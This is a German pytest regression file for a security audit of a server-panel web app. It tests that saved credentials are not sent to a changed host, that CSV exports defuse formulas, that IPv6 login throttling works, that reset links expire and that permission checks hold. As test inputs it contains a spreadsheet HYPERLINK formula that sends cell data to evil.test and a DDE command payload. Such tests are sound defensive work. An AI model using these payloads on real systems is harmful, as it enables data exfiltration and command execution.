"""Regressionstests zum Sicherheitsaudit vom 14.10.2026.

Jeder Test hält eine Grenze fest, die vorher überschritten werden konnte: gespeicherte Geheimnisse an fremde
Ziele, Formeln im Audit-Export, Anmeldeschutz über IPv6, alte Passwort-Links, fremde Einträge in der
Datenauskunft, Absturz-Neustart ohne Startrecht und übergroße Logos.
"""
from __future__ import annotations

import csv
import io
import re

import pytest
from PIL import Image

from conftest import PASSWORD
from hatchtower import accounts, audit, db, logos, main, routes_backup, security, setup
from test_backups import nas, smb_form  # noqa: F401  (nas ist eine Fixture)

NEW_PASSWORD = "Ganz-Neues-Passwort-456"


# -- Gespeicherte Geheimnisse nur an das bisherige Ziel ----------------------------------------------

def test_panel_adresse_aendern_braucht_neuen_key(world, monkeypatch):
    calls = []

    async def fake_test_panel(settings, panel_type, url, key):
        calls.append((url, key))
        return {"nodes": [], "servers": 0}
    monkeypatch.setattr(setup, "test_panel", fake_test_panel)
    c = world.client(world.ids["olga"])
    c.post("/admin/connection/panel", data={"csrf": c.csrf, "panel_url": "https://evil.test",
                                            "panel_type": "pterodactyl", "app_key": "", "next": "/admin/connection"})
    assert ("https://evil.test", "ptla_test") not in calls
    assert db.get_setting("conn_panel_url") != "https://evil.test"


def mail_form(c, **extra):
    return {"csrf": c.csrf, "enabled": "1", "host": "smtp.alt.test", "port": "587", "security": "starttls",
            "username": "post@example.com", "password": "", "sender": "post@example.com", **extra}


def test_smtp_server_aendern_braucht_neues_passwort(world):
    db.set_setting("mail_host", "smtp.alt.test", None)
    db.set_setting("mail_base_url", "https://hatchtower.test", None)
    stored = db.get_setting("mail_password_enc")
    c = world.client(world.ids["olga"])
    # gleicher Server: Passwort bleibt, Speichern klappt
    r = c.post("/admin/mail", data=mail_form(c, host="SMTP.alt.test"))
    assert "gespeichert" in r.headers["location"]
    assert db.get_setting("mail_password_enc") == stored
    # anderer Server ohne neues Passwort: nichts geändert
    r = c.post("/admin/mail", data=mail_form(c, host="smtp.evil.test"))
    assert "Passwort" in r.headers["location"]
    assert db.get_setting("mail_host") == "smtp.alt.test"
    # unverschlüsselt ohne neues Passwort: ebenfalls nicht
    r = c.post("/admin/mail", data=mail_form(c, security="none"))
    assert db.get_setting("mail_security") == "starttls"
    # mit neuem Passwort geht beides
    r = c.post("/admin/mail", data=mail_form(c, host="smtp.neu.test", password="Neues-SMTP-Passwort"))
    assert "gespeichert" in r.headers["location"]
    assert db.get_setting("mail_host") == "smtp.neu.test"
    assert main.vault.decrypt(db.get_setting("mail_password_enc")) == "Neues-SMTP-Passwort"


def test_smb_host_aendern_braucht_neues_passwort(world, nas, monkeypatch):  # noqa: F811
    c = world.client(world.ids["olga"])
    assert "angelegt" in c.post("/admin/backups/targets", data=smb_form(c)).headers["location"]
    with db.connect() as con:
        row = con.execute("SELECT * FROM backup_targets WHERE kind = 'smb'").fetchone()
    contacted = []
    original = routes_backup.checked

    async def spy(target):
        contacted.append((target.host, target.password))
        return await original(target)
    monkeypatch.setattr(routes_backup, "checked", spy)
    r = c.post(f"/admin/backups/targets/{row['id']}", data=smb_form(c, smb_host="evil.test", smb_password=""))
    assert "Passwort" in r.headers["location"]
    assert contacted == []                                  # der fremde Host wurde gar nicht erst gefragt
    with db.connect() as con:
        assert con.execute("SELECT smb_host FROM backup_targets WHERE id = ?", (row["id"],)).fetchone()[0] == "nas.test"
    # gleicher Host ohne Passwort: das gespeicherte bleibt
    r = c.post(f"/admin/backups/targets/{row['id']}", data=smb_form(c, name="NAS 2", smb_password=""))
    assert "NAS%202" in r.headers["location"] and contacted == [("nas.test", "Geheim-123")]
    assert security.same_host("NAS.test.", "nas.test") and not security.same_host("", "")


# -- Audit-Export ------------------------------------------------------------------------------------

def test_audit_csv_entschaerft_formeln(world):
    evil = '=HYPERLINK("https://evil.test/?d="&A1;"Klick")'
    c, token = world.anonymous_with_prelogin()
    c.post("/login", data={"username": evil, "password": "falsch", "prelogin": token})
    audit.record("console.command", username="olga", detail="+cmd|' /C calc'!A0")
    owner = world.client(world.ids["olga"])
    body = owner.get("/admin/audit/export?format=csv").content.decode("utf-8-sig")
    cells = [cell for row in csv.reader(io.StringIO(body), delimiter=";") for cell in row]
    assert "'" + evil[:64] in cells
    assert not [cell for cell in cells if cell[:1] in ("=", "+", "-", "@")]


# -- Anmeldeschutz ----------------------------------------------------------------------------------

def test_anmeldeschutz_fasst_ipv6_netz_zusammen():
    t = security.LoginThrottle(per_ip=3)
    for i in range(1, 4):
        t.record_failure(f"2001:db8:1:2::{i:x}")
    assert t.ip_blocked("2001:db8:1:2:ffff::1")           # gleiches /64
    assert not t.ip_blocked("2001:db8:1:3::1")            # anderes /64
    for i in range(1, 3):
        t.record_failure(f"192.0.2.{i}")
    assert not t.ip_blocked("192.0.2.3")                  # IPv4 bleibt einzeln
    assert t.net("::ffff:192.0.2.1") == "192.0.2.1"
    # Kontosperre ebenfalls pro Netz
    for _ in range(5):
        t.account_failure(7, "2001:db8:9::1", "hash")
    assert t.account_locked(7, "2001:db8:9::2", "hash") and not t.account_locked(7, "2001:db8:a::1", "hash")


# -- Passwort-Links -----------------------------------------------------------------------------------

def test_passwortwechsel_entwertet_reset_link(world):
    reset = world.args["@reset"]
    c = world.client(world.ids["victim"])
    c.post("/account/password", data={"csrf": c.csrf, "current": PASSWORD, "new": NEW_PASSWORD,
                                      "repeat": NEW_PASSWORD})
    assert accounts.get(reset, "reset") is None
    assert world.client().get(f"/reset/{reset}").status_code == 410


@pytest.mark.parametrize("how", ["owner_password", "deactivate"])
def test_owner_eingriff_entwertet_reset_link(world, how):
    uid = world.ids["victim"]
    reset = world.args["@reset"]
    c = world.client(world.ids["olga"])
    if how == "owner_password":
        c.post(f"/admin/users/{uid}/password", data={"csrf": c.csrf, "password": NEW_PASSWORD})
    else:
        c.post(f"/admin/users/{uid}/active", data={"csrf": c.csrf, "active": "0"})
    assert accounts.get(reset, "reset") is None


def test_neue_email_entwertet_reset_link(world):
    reset = world.args["@reset"]
    assert world.client().get(f"/verify/{world.args['@verify']}").status_code == 303
    assert accounts.get(reset, "reset") is None


# -- Datenauskunft ------------------------------------------------------------------------------------

def test_datenauskunft_ohne_eintraege_eines_frueheren_kontos(world):
    owner = world.client(world.ids["olga"])
    old = world.user("bob")
    with db.connect() as con:
        con.execute("INSERT INTO audit_log (ts, user_id, username, ip, action, result) VALUES"
                    " ('2026-01-01T10:00:00+00:00', ?, 'bob', '198.51.100.7', 'login', 'ok')", (old,))
    owner.post(f"/admin/users/{old}/delete", data={"csrf": owner.csrf})
    new = world.user("bob")                     # gleicher Name, meist auch gleiche ID
    audit.record("login", user_id=new, username="bob", ip="203.0.113.9")
    data = world.client(new).get("/account/export").json()
    ips = {e["ip"] for e in data["audit_log"]}
    assert "198.51.100.7" not in ips and "203.0.113.9" in ips


# -- Rechte: Absturz-Neustart ---------------------------------------------------------------------------

def crash_setting(ident: str):
    with db.connect() as con:
        row = con.execute("SELECT crash_restart FROM automation_settings WHERE identifier = ?", (ident,)).fetchone()
    return row["crash_restart"] if row else None


def test_absturz_neustart_braucht_startrecht(world):
    uid = world.user("planer", grants={"srv-a": {"automation.manage"}})
    c = world.client(uid)
    page = c.get("/admin/automation").text
    assert re.search(r'name="crash__srv-a"[^>]*disabled', page)
    c.post("/admin/automation/crash", data={"csrf": c.csrf, "crash__srv-a": "1"})
    assert crash_setting("srv-a") is None
    world.grant(uid, {"srv-a": {"automation.manage", "power.start"}})
    c.post("/admin/automation/crash", data={"csrf": c.csrf, "crash__srv-a": "1"})
    assert crash_setting("srv-a") == 1
    assert world.ptero.writes == []


def test_absturz_neustart_bleibt_wenn_startrecht_fehlt(world):
    with db.connect() as con:
        con.execute("INSERT INTO automation_settings (identifier, crash_restart, updated_at) VALUES ('srv-a', 1, ?)",
                    (db.utcnow(),))
    uid = world.user("planer", grants={"srv-a": {"automation.manage"}})
    c = world.client(uid)
    c.post("/admin/automation/crash", data={"csrf": c.csrf})      # alles abgewählt
    assert crash_setting("srv-a") == 1


# -- Logos ---------------------------------------------------------------------------------------------

def test_logo_mit_zu_vielen_pixeln_abgelehnt(tmp_path):
    buf = io.BytesIO()
    Image.new("1", (logos.MAX_PIXELS_SIDE + 1, 8)).save(buf, "PNG")
    assert len(buf.getvalue()) < logos.MAX_UPLOAD_BYTES
    with pytest.raises(logos.LogoError):
        logos.store_logo(buf.getvalue(), tmp_path)
    assert not list(tmp_path.iterdir())
